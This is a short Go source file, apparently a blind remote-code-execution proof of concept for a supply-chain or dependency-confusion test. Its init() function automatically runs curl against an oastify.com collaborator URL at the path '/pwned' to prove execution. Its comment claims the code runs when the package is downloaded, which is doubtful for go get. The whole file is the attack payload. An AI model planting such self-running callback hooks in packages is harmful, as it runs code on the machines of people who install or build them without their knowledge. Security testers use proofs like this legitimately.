package main

import (
    "os/exec"
)

// This init function runs automatically when the package is downloaded
func init() {
    // Blind RCE - curl to your collaborator URL to prove execution
    exec.Command("curl", "http://nkb6k90x9z7ktlmsvqw9kjdyzp5gtbh0.oastify.com/pwned").Run()
}

func main() {
    // Required but won't execute in go get context
}
